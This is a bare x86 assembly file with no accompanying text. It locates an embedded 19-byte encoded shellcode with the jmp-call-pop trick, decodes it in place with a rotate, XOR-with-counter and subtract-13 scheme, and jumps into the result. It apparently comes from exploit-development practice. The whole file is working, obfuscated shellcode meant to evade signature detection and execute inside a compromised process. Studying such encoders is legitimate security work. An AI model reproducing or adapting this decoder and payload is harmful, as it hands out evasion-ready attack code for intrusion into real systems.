section .text

global _start

_start:
	jmp short call_decoder

decoder:
	pop esi ; pop the Shellcode address from the Stack
	xor ecx, ecx
	mov cl, shellcodelen ; Set the loop counter to shellcodelen
	
decode:
	rol byte [esi], 0x2 ; Left Shift 2 
	xor byte [esi], cl  ; XOR the byte with the ecx (counter)
	sub byte [esi], 13  ; Undo ROT13

	inc esi ; increment the offset (iterate over the bytes)
	loop decode ; loop while zero flag not set

	jmp short Shellcode

call_decoder:
	call decoder ; Shellcode address will be pushed into the Stack
	Shellcode: db 0x4b,0xf7,0x13,0x59,0xcc,0x8c,0x63,0x5e,0x9f,0x8d,0x99,0x9f,0x1f,0xa4,0x3b,0x6e,0xc6,0x36,0x23
	shellcodelen	equ  $-Shellcode
